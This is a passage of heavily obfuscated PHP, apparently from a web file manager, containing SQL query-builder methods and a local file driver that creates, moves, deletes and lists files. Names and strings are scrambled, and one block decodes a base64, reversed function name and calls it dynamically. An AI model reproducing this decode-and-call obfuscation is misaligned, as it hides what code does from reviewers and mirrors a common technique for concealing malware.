$ÂıâÈã¾ = array(); foreach ($—Ìì—Å as $“€ŠÎØì => $•Å½‹×‘) { if (is_numeric($“€ŠÎØì)) { $ÂıâÈã¾[] = $this->parseKey($•Å½‹×‘); } else { $•Å½‹×‘ = in_array(strtoupper(trim($•Å½‹×‘)), array($€šŞ×ó®[1196], $€šŞ×ó®[1197])) ? $€šŞ×ó®[53] . $•Å½‹×‘ : $€šŞ×ó®[12]; if (preg_match($€šŞ×ó®[1198], $“€ŠÎØì)) { $ÂıâÈã¾[] = $this->parseKey($“€ŠÎØì) . $•Å½‹×‘; } else { think_exception($€šŞ×ó®[1199] . $“€ŠÎØì); } } } $—Ìì—Å = implode($€šŞ×ó®[50], $ÂıâÈã¾); } return !empty($—Ìì—Å) ? $€šŞ×ó®[1200] . $—Ìì—Å : $€šŞ×ó®[12]; } protected function parseGroup($ä‚ıŠˆŠ) { $´Ğ–»Ò =& $_SERVER[ïÃ°£«Ê]; return !empty($ä‚ıŠˆŠ) ? $´Ğ–»Ò[1201] . $ä‚ıŠˆŠ : $´Ğ–»Ò[12]; } protected function parseHaving($ùÈ‹°ó¾) { $Ë¿õùÊ¸ =& $_SERVER[ïÃ°£«Ê]; return !empty($ùÈ‹°ó¾) ? $Ë¿õùÊ¸[1202] . $ùÈ‹°ó¾ : $Ë¿õùÊ¸[12]; } protected function parseComment($Ê‰­³¸£) { $¯ˆÜÉÉŒ =& $_SERVER[ïÃ°£«Ê]; return !empty($Ê‰­³¸£) ? $¯ˆÜÉÉŒ[1203] . $Ê‰­³¸£ . $¯ˆÜÉÉŒ[1204] : $¯ˆÜÉÉŒ[12]; } protected function parseDistinct($÷ÀıŸÜ‹) { $¡ƒ©ØŸ =& $_SERVER[ïÃ°£«Ê]; return !empty($÷ÀıŸÜ‹) ? $¡ƒ©ØŸ[1205] : $¡ƒ©ØŸ[12]; } protected function parseUnion($Õú¬ß®¶) { $ÈïùÊ‘ =& $_SERVER[ïÃ°£«Ê]; if (empty($Õú¬ß®¶)) { return $ÈïùÊ‘[12]; } if (isset($Õú¬ß®¶[$ÈïùÊ‘[423]])) { $”´©åÎ³ = $ÈïùÊ‘[1206]; unset($Õú¬ß®¶[$ÈïùÊ‘[423]]); } else { $”´©åÎ³ = $ÈïùÊ‘[1207]; } foreach ($Õú¬ß®¶ as $Ğıºíª) { $ß¡¤Öïø[] = $”´©åÎ³ . (is_array($Ğıºíª) ? $this->buildSelectSql($Ğıºíª) : $Ğıºíª); } return implode($ÈïùÊ‘[53], $ß¡¤Öïø); } public function insert($öúÑêí, $İúø„·ï = array(), $ÊáøªöÍ = false) { $°·–Œ =& $_SERVER[ïÃ°£«Ê]; $‚¦´õ¶Ğ = $´…òÅ®Â = array(); $this->model = $İúø„·ï[$°·–Œ[359]]; foreach ($öúÑêí as $ââ„³‡¾ => $¡½³¢ø») { if (is_array($¡½³¢ø») && $°·–Œ[372] == $¡½³¢ø»[0]) { $´…òÅ®Â[] = $this->parseKey($ââ„³‡¾); $‚¦´õ¶Ğ[] = $¡½³¢ø»[1]; } elseif (is_scalar($¡½³¢ø») || is_null($¡½³¢ø»)) { $´…òÅ®Â[] = $this->parseKey($ââ„³‡¾); $‚¦´õ¶Ğ[] = $this->parseValue($¡½³¢ø»); } } $÷©Ö¼îñ = ($ÊáøªöÍ ? $°·–Œ[1069] : $°·–Œ[1070]) . $°·–Œ[1071] . $this->parseTable($İúø„·ï[$°·–Œ[357]]) . $°·–Œ[1065] . implode($°·–Œ[50], $´…òÅ®Â) . $°·–Œ[1066] . implode($°·–Œ[50], $‚¦´õ¶Ğ) . $°·–Œ[1067]; $÷©Ö¼îñ .= $this->parseLock(isset($İúø„·ï[$°·–Œ[1001]]) ? $İúø„·ï[$°·–Œ[1001]] : !1); $÷©Ö¼îñ .= $this->parseComment(!empty($İúø„·ï[$°·–Œ[429]]) ? $İúø„·ï[$°·–Œ[429]] : $°·–Œ[12]); return $this->execute($÷©Ö¼îñ, $this->parseBind(!empty($İúø„·ï[$°·–Œ[361]]) ? $İúø„·ï[$°·–Œ[361]] : array())); } public function selectInsert($î±ø“ùË, $ÁÕó‡ğô, $ƒ’ùš¾É = array()) { $±ÅÎÈº =& $_SERVER[ïÃ°£«Ê]; $this->model = $ƒ’ùš¾É[$±ÅÎÈº[359]]; if (is_string($î±ø“ùË)) { $î±ø“ùË = explode($±ÅÎÈº[50], $î±ø“ùË); } array_walk($î±ø“ùË, array($this, $±ÅÎÈº[1068])); $˜•—¾µˆ = $±ÅÎÈº[1208] . $this->parseTable($ÁÕó‡ğô) . $±ÅÎÈº[1065] . implode($±ÅÎÈº[50], $î±ø“ùË) . $±ÅÎÈº[1186]; $˜•—¾µˆ .= $this->buildSelectSql($ƒ’ùš¾É); return $this->execute($˜•—¾µˆ, $this->parseBind(!empty($ƒ’ùš¾É[$±ÅÎÈº[361]]) ? $ƒ’ùš¾É[$±ÅÎÈº[361]] : array())); } public function update($ëéî–ŒŒ, $Ìä¿¡’ö) { $‘è’ÍÃ÷ =& $_SERVER[ïÃ°£«Ê]; $this->model = $Ìä¿¡’ö[$‘è’ÍÃ÷[359]]; $ùĞè›×ñ = $‘è’ÍÃ÷[1209] . $this->parseTable($Ìä¿¡’ö[$‘è’ÍÃ÷[357]]) . $this->parseSet($ëéî–ŒŒ) . $this->parseWhere(!empty($Ìä¿¡’ö[$‘è’ÍÃ÷[353]]) ? $Ìä¿¡’ö[$‘è’ÍÃ÷[353]] : $‘è’ÍÃ÷[12]) . $this->parseOrder(!empty($Ìä¿¡’ö[$‘è’ÍÃ÷[441]]) ? $Ìä¿¡’ö[$‘è’ÍÃ÷[441]] : $‘è’ÍÃ÷[12]) . $this->parseLimit(!empty($Ìä¿¡’ö[$‘è’ÍÃ÷[368]]) ? $Ìä¿¡’ö[$‘è’ÍÃ÷[368]] : $‘è’ÍÃ÷[12]) . $this->parseLock(isset($Ìä¿¡’ö[$‘è’ÍÃ÷[1001]]) ? $Ìä¿¡’ö[$‘è’ÍÃ÷[1001]] : !1) . $this->parseComment(!empty($Ìä¿¡’ö[$‘è’ÍÃ÷[429]]) ? $Ìä¿¡’ö[$‘è’ÍÃ÷[429]] : $‘è’ÍÃ÷[12]); return $this->execute($ùĞè›×ñ, $this->parseBind(!empty($Ìä¿¡’ö[$‘è’ÍÃ÷[361]]) ? $Ìä¿¡’ö[$‘è’ÍÃ÷[361]] : array())); } public function delete($Àöìªë© = array()) { $ò¼Ï™Ú° =& $_SERVER[ïÃ°£«Ê]; $this->model = $Àöìªë©[$ò¼Ï™Ú°[359]]; $Š»àõéŠ = $ò¼Ï™Ú°[1210] . $this->parseTable($Àöìªë©[$ò¼Ï™Ú°[357]]) . $this->parseWhere(!empty($Àöìªë©[$ò¼Ï™Ú°[353]]) ? $Àöìªë©[$ò¼Ï™Ú°[353]] : $ò¼Ï™Ú°[12]) . $this->parseOrder(!empty($Àöìªë©[$ò¼Ï™Ú°[441]]) ? $Àöìªë©[$ò¼Ï™Ú°[441]] : $ò¼Ï™Ú°[12]) . $this->parseLimit(!empty($Àöìªë©[$ò¼Ï™Ú°[368]]) ? $Àöìªë©[$ò¼Ï™Ú°[368]] : $ò¼Ï™Ú°[12]) . $this->parseLock(isset($Àöìªë©[$ò¼Ï™Ú°[1001]]) ? $Àöìªë©[$ò¼Ï™Ú°[1001]] : !1) . $this->parseComment(!empty($Àöìªë©[$ò¼Ï™Ú°[429]]) ? $Àöìªë©[$ò¼Ï™Ú°[429]] : $ò¼Ï™Ú°[12]); return $this->execute($Š»àõéŠ, $this->parseBind(!empty($Àöìªë©[$ò¼Ï™Ú°[361]]) ? $Àöìªë©[$ò¼Ï™Ú°[361]] : array())); } public function select($ãÀñ±ˆÀ = array()) { $éˆ¡¹ç± =& $_SERVER[ïÃ°£«Ê]; $this->model = $ãÀñ±ˆÀ[$éˆ¡¹ç±[359]]; $óÁ¼œáÕ = $this->buildSelectSql($ãÀñ±ˆÀ); $ñäü±…ª = isset($ãÀñ±ˆÀ[$éˆ¡¹ç±[424]]) ? $ãÀñ±ˆÀ[$éˆ¡¹ç±[424]] : !1; if ($ñäü±…ª) { $éÌ§½Ùœ = is_string($ñäü±…ª[$éˆ¡¹ç±[95]]) ? $ñäü±…ª[$éˆ¡¹ç±[95]] : $éˆ¡¹ç±[1211] . md5($óÁ¼œáÕ); $Á©ÛåÒ“ = think_cache($éÌ§½Ùœ, $éˆ¡¹ç±[12], $ñäü±…ª); if (!1 !== $Á©ÛåÒ“) { return $Á©ÛåÒ“; } } $áœ©ˆÊù = $this->query($óÁ¼œáÕ, $this->parseBind(!empty($ãÀñ±ˆÀ[$éˆ¡¹ç±[361]]) ? $ãÀñ±ˆÀ[$éˆ¡¹ç±[361]] : array())); if ($ñäü±…ª && !1 !== $áœ©ˆÊù) { think_cache($éÌ§½Ùœ, $áœ©ˆÊù, $ñäü±…ª); } return $áœ©ˆÊù; } public function buildSelectSql($¾ùá¦é€ = array()) { $¾ÅÀÇ…ê =& $_SERVER[ïÃ°£«Ê]; if (isset($¾ùá¦é€[$¾ÅÀÇ…ê[428]])) { if (strpos($¾ùá¦é€[$¾ÅÀÇ…ê[428]], $¾ÅÀÇ…ê[50])) { list($ı¢„£š, $”‹›ñîø) = explode($¾ÅÀÇ…ê[50], $¾ùá¦é€[$¾ÅÀÇ…ê[428]]); } else { $ı¢„£š = $¾ùá¦é€[$¾ÅÀÇ…ê[428]]; } $ı¢„£š = $ı¢„£š ? $ı¢„£š : 1; $”‹›ñîø = isset($”‹›ñîø) ? $”‹›ñîø : (is_numeric($¾ùá¦é€[$¾ÅÀÇ…ê[368]]) ? $¾ùá¦é€[$¾ÅÀÇ…ê[368]] : 20); $·¸ëÓáî = $”‹›ñîø * ((int) $ı¢„£š - 1); $¾ùá¦é€[$¾ÅÀÇ…ê[368]] = $·¸ëÓáî . $¾ÅÀÇ…ê[50] . $”‹›ñîø; } if (think_config($¾ÅÀÇ…ê[1212])) { $˜óÃ»• = $¾ÅÀÇ…ê[1213] . md5(serialize($¾ùá¦é€)); $ŒíÑäÄ‹ = think_cache($˜óÃ»•); if ($ŒíÑäÄ‹) { return $ŒíÑäÄ‹; } } $¾œ¾Ï€• = $this->parseSql($this->selectSql, $¾ùá¦é€); $¾œ¾Ï€• .= $this->parseLock(isset($¾ùá¦é€[$¾ÅÀÇ…ê[1001]]) ? $¾ùá¦é€[$¾ÅÀÇ…ê[1001]] : !1); if (isset($˜óÃ»•)) { think_cache($˜óÃ»•, $¾œ¾Ï€•); } return $¾œ¾Ï€•; } public function parseSql($Ä´Ù©Î–, $‹ÃÎšÁÚ = array()) { $¬½î³¹ä =& $_SERVER[ïÃ°£«Ê]; $Ä´Ù©Î– = str_replace(array($¬½î³¹ä[1214], $¬½î³¹ä[1215], $¬½î³¹ä[1216], $¬½î³¹ä[1217], $¬½î³¹ä[1218], $¬½î³¹ä[1219], $¬½î³¹ä[1220], $¬½î³¹ä[1221], $¬½î³¹ä[1222], $¬½î³¹ä[1223], $¬½î³¹ä[1224]), array($this->parseTable("{$‹ÃÎšÁÚ[$¬½î³¹ä[357]]}"), $this->parseDistinct(isset($‹ÃÎšÁÚ[$¬½î³¹ä[1225]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[1225]] : !1), $this->parseField(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[351]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[351]] : $¬½î³¹ä[220]), $this->parseJoin(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[360]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[360]] : $¬½î³¹ä[12]), $this->parseWhere(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[353]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[353]] : $¬½î³¹ä[12]), $this->parseGroup(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[598]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[598]] : $¬½î³¹ä[12]), $this->parseHaving(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[1226]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[1226]] : $¬½î³¹ä[12]), $this->parseOrder(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[441]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[441]] : $¬½î³¹ä[12]), $this->parseLimit(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[368]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[368]] : $¬½î³¹ä[12]), $this->parseUnion(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[422]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[422]] : $¬½î³¹ä[12]), $this->parseComment(!empty($‹ÃÎšÁÚ[$¬½î³¹ä[429]]) ? $‹ÃÎšÁÚ[$¬½î³¹ä[429]] : $¬½î³¹ä[12])), $Ä´Ù©Î–); return $Ä´Ù©Î–; } public function getLastSql($çıÃèê´ = '') { return $çıÃèê´ ? $this->modelSql[$çıÃèê´] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Ì­÷¿»£) { return addslashes($Ì­÷¿»£); } public function setModel($±ÛšŸ£) { $this->model = $±ÛšŸ£; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto FÒÔÊå¡ì; AÖø¡å®–Ë: $fileSize = strrev(base64_decode($_SERVER[øÃÑ²Œ][0])); function binCheckNeq($§Şªí²¥, $ÙĞúØ·É) { return $§Şªí²¥ != $ÙĞúØ·É; } $_SERVER[$_SERVER[øÃÑ²Œ][1]] = $fileSize($_SERVER[$_SERVER[øÃÑ²Œ][2]]); goto e‚øÑæÜÔ¿; FÉ±„õôêƒ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($çùò€£) { if (substr($çùò€£, 0, 2) == $_SERVER[ïÃ°£«Ê][1525]) { $çùò€£ = BASIC_PATH . substr($çùò€£, 2); } return $çùò€£; } public function iconvApp($©¬õÚ¸Ö) { $©ÉÈ£áò =& $_SERVER[ïÃ°£«Ê]; global $config; return $this->iconvTo($©¬õÚ¸Ö, $config[$©ÉÈ£áò[1649]], $config[$©ÉÈ£áò[1648]]); } public function iconvSystem($ë½ÎÖÂ¸) { $ß¨Ã²¹ =& $_SERVER[ïÃ°£«Ê]; global $config; return $this->iconvTo($ë½ÎÖÂ¸, $config[$ß¨Ã²¹[1648]], $config[$ß¨Ã²¹[1649]]); } public function getPathOuter($µ€¬³Ñ) { $×»µŠ‚ğ =& $_SERVER[ïÃ°£«Ê]; $èŸªƒ¦‹ = $this->iconvApp($this->pathBase); $µ€¬³Ñ = $this->iconvApp($µ€¬³Ñ); if (substr($èŸªƒ¦‹, 0, 2) == $×»µŠ‚ğ[1525]) { $èŸªƒ¦‹ = BASIC_PATH . substr($èŸªƒ¦‹, 2); } if (substr($µ€¬³Ñ, 0, 2) == $×»µŠ‚ğ[1525]) { $µ€¬³Ñ = BASIC_PATH . substr($µ€¬³Ñ, 2); } $èŸªƒ¦‹ = KodIO::clear($èŸªƒ¦‹); $µ€¬³Ñ = KodIO::clear($µ€¬³Ñ); $µ€¬³Ñ = substr($µ€¬³Ñ, strlen($èŸªƒ¦‹)); if (empty($this->pathDriver)) { return $µ€¬³Ñ; } return $this->pathDriver . $×»µŠ‚ğ[8] . ltrim($µ€¬³Ñ, $×»µŠ‚ğ[8]); } public function mkfile($¦Ö±éÔ€, $”¥… Œˆ = '', $‹ç’•åÈ = REPEAT_RENAME) { $¦Ö±éÔ€ = $this->iconvSystem($¦Ö±éÔ€); @touch($¦Ö±éÔ€); if ($”¥… Œˆ) { file_put_contents($¦Ö±éÔ€, $”¥… Œˆ); } @chmod($¦Ö±éÔ€, $this->pathAuth); if (is_file($¦Ö±éÔ€)) { return $this->getPathOuter($¦Ö±éÔ€); } $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); return !1; } public function mkdir($âÆßš¢¿, $¾¡Íú‹ = REPEAT_SKIP) { $âÆßš¢¿ = $this->iconvSystem($âÆßš¢¿); if (is_dir($âÆßš¢¿)) { return $this->getPathOuter($âÆßš¢¿); } @mkdir($âÆßš¢¿, $this->pathAuth, !0); @chmod($âÆßš¢¿, $this->pathAuth); if (is_dir($âÆßš¢¿)) { return $this->getPathOuter($âÆßš¢¿); } $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); return !1; } public function copyFile($ğ™Æıšû, $Œ¡ÜœœÑ) { $this->mkdir($this->pathFather($Œ¡ÜœœÑ)); $ğ™Æıšû = $this->iconvSystem($ğ™Æıšû); $Œ¡ÜœœÑ = $this->iconvSystem($Œ¡ÜœœÑ); $ÚĞŸ­ = copy_64($ğ™Æıšû, $Œ¡ÜœœÑ); @chmod($Œ¡ÜœœÑ, $this->pathAuth); if ($ÚĞŸ­) { return $this->getPathOuter($Œ¡ÜœœÑ); } $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); return !1; } public function moveFile($ó ¤Íª¿, $¼×ÏÓ‡¿) { $this->mkdir($this->pathFather($¼×ÏÓ‡¿)); $ó ¤Íª¿ = $this->iconvSystem($ó ¤Íª¿); $¼×ÏÓ‡¿ = $this->iconvSystem($¼×ÏÓ‡¿); $’ºÒÑ¥¾ = intval(@rename($ó ¤Íª¿, $¼×ÏÓ‡¿)); if (!$’ºÒÑ¥¾) { if ($’ºÒÑ¥¾ = intval(@copy_64($ó ¤Íª¿, $¼×ÏÓ‡¿))) { @unlink($ó ¤Íª¿); } } @chmod($¼×ÏÓ‡¿, $this->pathAuth); if ($’ºÒÑ¥¾) { return $this->getPathOuter($¼×ÏÓ‡¿); } $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); return !1; } public function movePath($¨–ÁÎö, $ÇÕŒÂôµ, $äíÑ¹áÌ = false) { $áÄÌÄ·Ô =& $_SERVER[ïÃ°£«Ê]; $¨–ÁÎö = $this->iconvSystem($¨–ÁÎö); $ÇÕŒÂôµ = $this->iconvSystem($ÇÕŒÂôµ); $÷€‘·ÍÛ = rtrim($ÇÕŒÂôµ, $áÄÌÄ·Ô[8]) . $áÄÌÄ·Ô[8] . ($äíÑ¹áÌ ? $äíÑ¹áÌ : get_path_this($¨–ÁÎö)); if (file_exists($÷€‘·ÍÛ)) { return !1; } $¢ä†óÅØ = intval(@rename($¨–ÁÎö, $÷€‘·ÍÛ)); $¢ä†óÅØ = file_exists($÷€‘·ÍÛ); if ($¢ä†óÅØ) { return $this->getPathOuter($÷€‘·ÍÛ); } $this->writeLog(__FUNCTION__ . $áÄÌÄ·Ô[1660], !0); return !1; } public function delFile($ »…ş™Ö) { $ »…ş™Ö = $this->iconvSystem($ »…ş™Ö); if (!@unlink($ »…ş™Ö)) { @chmod($ »…ş™Ö, $this->pathAuth); if (@unlink($ »…ş™Ö)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); return !1; } return !0; } public function delFolder($÷¯îÅé§) { $Àğ°é…° =& $_SERVER[ïÃ°£«Ê]; $÷¯îÅé§ = $this->iconvSystem($÷¯îÅé§); if (!is_dir($÷¯îÅé§)) { return !0; } if (!($Ã³ÑŒÆ¨ = opendir($÷¯îÅé§))) { return !1; } while (($¡÷äì”ğ = readdir($Ã³ÑŒÆ¨)) !== !1) { if ($¡÷äì”ğ == $Àğ°é…°[10] || $¡÷äì”ğ == $Àğ°é…°[1470]) { continue; } $¢Êé‹ùï = $÷¯îÅé§ . $Àğ°é…°[8] . $¡÷äì”ğ; if (is_file($¢Êé‹ùï) || is_link($¢Êé‹ùï)) { if (!unlink($¢Êé‹ùï)) { chmod($¢Êé‹ùï, $this->pathAuth); if (!unlink($¢Êé‹ùï)) { return !1; } } } else { if (is_dir($¢Êé‹ùï)) { chmod($¢Êé‹ùï, $this->pathAuth); $¢Êé‹ùï = $this->iconvApp($¢Êé‹ùï); if (!$this->delFolder($¢Êé‹ùï)) { return !1; } } } } closedir($Ã³ÑŒÆ¨); return rmdir($÷¯îÅé§); } public function rename($©¿¥æÉı, $‚İØªÖ) { $ŠŠêÊÍ =& $_SERVER[ïÃ°£«Ê]; $¿â¨–˜ì = $this->fileNameAuto($this->pathFather($©¿¥æÉı), $‚İØªÖ); $¿â¨–˜ì = $this->iconvSystem($¿â¨–˜ì); $©¿¥æÉı = $this->iconvSystem($©¿¥æÉı); $Á…•®ˆº = $this->pathFather($©¿¥æÉı); $‹ô’ñ’í = rtrim($Á…•®ˆº, $ŠŠêÊÍ[8]) . $ŠŠêÊÍ[8] . $¿â¨–˜ì; $ Ğ–¹Š = @rename($©¿¥æÉı, $‹ô’ñ’í); $‹ô’ñ’í = $this->iconvApp($‹ô’ñ’í); if ($ Ğ–¹Š) { return $this->getPathOuter($‹ô’ñ’í); } $this->writeLog(__FUNCTION__ . $ŠŠêÊÍ[1660], !0); return !1; } public function size($«Â²Èö‰) { $«Â²Èö‰ = $this->iconvSystem($«Â²Èö‰); return filesize_64($«Â²Èö‰); } public function info($¥£óÔã) { $¥£óÔã = $this->iconvSystem($¥£óÔã); if ($this->isFolder($¥£óÔã)) { return $this->folderInfo($¥£óÔã); } else { if ($this->isFile($¥£óÔã)) { return $this->fileInfo($¥£óÔã); } } return !1; } protected function infoChildren($»Ä’¡Ğô, &$ÎáËÏ×Ö, $ó’¹Ÿª“ = true) { $¡ŞË¿×­ =& $_SERVER[ïÃ°£«Ê]; check_abort_echo(); $»Ä’¡Ğô = rtrim($»Ä’¡Ğô, $¡ŞË¿×­[8]) . $¡ŞË¿×­[8]; if ($ó’¹Ÿª“) { $»Ä’¡Ğô = $this->iconvSystem($»Ä’¡Ğô); } if (!($¼ó´°¥ = @opendir($»Ä’¡Ğô))) { return; } while (($çÕ±û‹ = readdir($¼ó´°¥)) !== !1) { if ($çÕ±û‹ == $¡ŞË¿×­[10] || $çÕ±û‹ == $¡ŞË¿×­[1470]) { continue; } $‡§Ó¬¯ = $»Ä’¡Ğô . $çÕ±û‹; if (is_file($‡§Ó¬¯) || is_link($‡§Ó¬¯)) { $ÎáËÏ×Ö[$¡ŞË¿×­[80]]++; $ÎáËÏ×Ö[$¡ŞË¿×­[79]] += filesize_64($‡§Ó¬¯); } else { if (is_dir($‡§Ó¬¯)) { $ÎáËÏ×Ö[$¡ŞË¿×­[81]]++; $this->infoChildren($‡§Ó¬¯, $ÎáËÏ×Ö, !1); } } } closedir($¼ó´°¥); } private function folderInfo($‰½Å¥Í, $¦šÉ² = false) { $šé€íôÓ =& $_SERVER[ïÃ°£«Ê]; $‰½Å¥Í = rtrim($‰½Å¥Í, $šé€íôÓ[8]) . $šé€íôÓ[8]; $óä€­Ìß = $this->iconvApp($this->pathThis($‰½Å¥Í)); if ($¦šÉ²) { return array($šé€íôÓ[32] => $óä€­Ìß, $šé€íôÓ[87] => $this->getPathOuter($‰½Å¥Í), $šé€íôÓ[33] => $šé€íôÓ[78]); } $†ºß¦”‚ = array($šé€íôÓ[32] => $óä€­Ìß, $šé€íôÓ[87] => $this->getPathOuter($‰½Å¥Í), $šé€íôÓ[33] => $šé€íôÓ[78], $šé€íôÓ[231] => @filectime($‰½Å¥Í), $šé€íôÓ[88] => @filemtime($‰½Å¥Í), $šé€íôÓ[1664] => @fileatime($‰½Å¥Í), $šé€íôÓ[1665] => is_readable($‰½Å¥Í), $šé€íôÓ[1666] => is_writable($‰½Å¥Í), $šé€íôÓ[1667] => get_mode($‰½Å¥Í)); return $†ºß¦”‚; } private function fileInfo($ÖÖ¦±˜ê, $·¥ò”ãù = false) { $÷ÅÎÛÇ =& $_SERVER[ïÃ°£«Ê]; $Ğêé¯ëò = $this->iconvApp($this->pathThis($ÖÖ¦±˜ê)); if ($·¥ò”ãù) { return array($÷ÅÎÛÇ[32] => $Ğêé¯ëò, $÷ÅÎÛÇ[87] => $this->getPathOuter($ÖÖ¦±˜ê), $÷ÅÎÛÇ[33] => $÷ÅÎÛÇ[230], $÷ÅÎÛÇ[79] => $this->size($ÖÖ¦±˜ê), $÷ÅÎÛÇ[166] => $this->ext($Ğêé¯ëò)); } $¯¥¹»´ = array($÷ÅÎÛÇ[32] => $Ğêé¯ëò, $÷ÅÎÛÇ[87] => $this->getPathOuter($ÖÖ¦±˜ê), $÷ÅÎÛÇ[33] => $÷ÅÎÛÇ[230], $÷ÅÎÛÇ[231] => @filectime($ÖÖ¦±˜ê), $÷ÅÎÛÇ[88] => @filemtime($ÖÖ¦±˜ê), $÷ÅÎÛÇ[1664] => @fileatime($ÖÖ¦±˜ê), $÷ÅÎÛÇ[79] => $this->size($ÖÖ¦±˜ê), $÷ÅÎÛÇ[166] => $this->ext($Ğêé¯ëò), $÷ÅÎÛÇ[1665] => is_readable($ÖÖ¦±˜ê), $÷ÅÎÛÇ[1666] => is_writable($ÖÖ¦±˜ê), $÷ÅÎÛÇ[1667] => get_mode($ÖÖ¦±˜ê)); return $¯¥¹»´; } public function exist($÷ğ×ÍÚ) { $÷ğ×ÍÚ = $this->iconvSystem($÷ğ×ÍÚ); return @file_exists($÷ğ×ÍÚ); } public function isFile($´ôÊ¦Œª) { $´ôÊ¦Œª = $this->iconvSystem($´ôÊ¦Œª); return @is_file($´ôÊ¦Œª); } public function isFolder($üÚÈÂ®ã) { $üÚÈÂ®ã = $this->iconvSystem($üÚÈÂ®ã); return @is_dir($üÚÈÂ®ã); } public function listPath($İ¸ö«ØÉ, $©”Ç… = false) { $úã„¬ÌÍ =& $_SERVER[ïÃ°£«Ê]; $İ¸ö«ØÉ = $this->iconvSystem($İ¸ö«ØÉ); $İ¸ö«ØÉ = rtrim($İ¸ö«ØÉ, $úã„¬ÌÍ[8]) . $úã„¬ÌÍ[8]; $ŒğĞã±à = array($úã„¬ÌÍ[85] => array(), $úã„¬ÌÍ[86] => array()); if (!($£ß‚²¾ú = @opendir($İ¸ö«ØÉ))) { return $ŒğĞã±à; } while (($áµ¿êáÊ = readdir($£ß‚²¾ú)) !== !1) { if ($áµ¿êáÊ == $úã„¬ÌÍ[10] || $áµ¿êáÊ == $úã„¬ÌÍ[1470]) { continue; } $½©üÕï™ = $İ¸ö«ØÉ . $áµ¿êáÊ; if (is_file($½©üÕï™)) { $ŒğĞã±à[$úã„¬ÌÍ[86]][] = $this->fileInfo($½©üÕï™, $©”Ç…); } else { $ŒğĞã±à[$úã„¬ÌÍ[85]][] = $this->folderInfo($½©üÕï™, $©”Ç…); } } closedir($£ß‚²¾ú); return $ŒğĞã±à; } public function listAll($´šèª–Ã, &$³¯˜¨êÛ = array()) { $Á“ú’§½ =& $_SERVER[ïÃ°£«Ê]; $´šèª–Ã = $this->iconvSystem($´šèª–Ã); $´šèª–Ã = rtrim($´šèª–Ã, $Á“ú’§½[8]) . $Á“ú’§½[8]; if (!($ì×á¤ıÂ = @opendir($´šèª–Ã))) { return $³¯˜¨êÛ; } while (($·æ®íå = readdir($ì×á¤ıÂ)) !== !1) { if ($·æ®íå == $Á“ú’§½[10] || $·æ®íå == $Á“ú’§½[1470]) { continue; } $äÕ–’­ë = $´šèª–Ã . $·æ®íå; $ÚÉÃü½ö = is_dir($äÕ–’­ë) && !is_link($äÕ–’­ë) ? 1 : 0; $äÕ–’­ë = $ÚÉÃü½ö ? $äÕ–’­ë . $Á“ú’§½[8] : $äÕ–’­ë; $³¯˜¨êÛ[] = array($Á“ú’§½[87] => $this->getPathOuter($äÕ–’­ë), $Á“ú’§½[78] => $ÚÉÃü½ö, $Á“ú’§½[88] => intval(@filemtime($äÕ–’­ë)), $Á“ú’§½[79] => $ÚÉÃü½ö ? 0 : intval($this->size($äÕ–’­ë))); if ($ÚÉÃü½ö) { $this->listAll($äÕ–’­ë, $³¯˜¨êÛ); } } closedir($ì×á¤ıÂ); return $³¯˜¨êÛ; } public function has($¼Ì’ ÆÆ, $ƒ«Œê…Ê = false, $¿şø‚•Ğ = true) { $ŞÑñ‹÷Ü =& $_SERVER[ïÃ°£«Ê]; $¼Ì’ ÆÆ = $this->iconvSystem($¼Ì’ ÆÆ); $¼Ì’ ÆÆ = rtrim($¼Ì’ ÆÆ, $ŞÑñ‹÷Ü[8]) . $ŞÑñ‹÷Ü[8]; if (!($ó³À¹¸î = @opendir($¼Ì’ ÆÆ))) { return !1; } $»¤©ï‚™ = 0; $âêš¤ò‰ = 0; $Ÿš»Ğù­ = 0; while (($”ÆÄíøâ = readdir($ó³À¹¸î)) !== !1) { if ($”ÆÄíøâ == $ŞÑñ‹÷Ü[10] || $”ÆÄíøâ == $ŞÑñ‹÷Ü[1470]) { continue; } $£ó²ªˆÍ = $¼Ì’ ÆÆ . $”ÆÄíøâ; if ($ƒ«Œê…Ê) { $Ÿš»Ğù­++; if (@is_file($£ó²ªˆÍ)) { $»¤©ï‚™++; } else { $âêš¤ò‰++; } if ($Ÿš»Ğù­ > 10000) { break; } continue; } if ($¿şø‚•Ğ) { if (@is_file($£ó²ªˆÍ)) { return !0; } } else { if (@is_dir($£ó²ªˆÍ . $ŞÑñ‹÷Ü[8])) { return !0; } } } closedir($ó³À¹¸î); if ($ƒ«Œê…Ê) { return array($ŞÑñ‹÷Ü[239] => $»¤©ï‚™, $ŞÑñ‹÷Ü[240] => $âêš¤ò‰); } return !1; } public function hashSimple($›²Ğ‹Ù) { $ÛÆÙ¯æ“ =& $_SERVER[ïÃ°£«Ê]; if (!$›²Ğ‹Ù) { return md5($ÛÆÙ¯æ“[12]); } $›²Ğ‹Ù = $this->iconvSystem($›²Ğ‹Ù); $¸œ¬Í× = $this->size($›²Ğ‹Ù); 